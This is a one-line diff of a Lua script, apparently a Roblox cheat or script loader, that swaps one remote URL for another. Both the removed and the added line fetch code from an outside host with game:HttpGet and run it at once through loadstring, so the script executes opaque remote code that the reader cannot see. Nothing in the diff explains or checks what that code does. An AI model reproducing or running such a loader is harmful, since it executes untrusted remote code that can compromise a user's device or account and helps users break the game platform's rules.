@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.obscuravm.com/scripts/8326523980588224975"))()
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/cafbc30d9f01a2bc7d5714dd79852d78.lua"))()
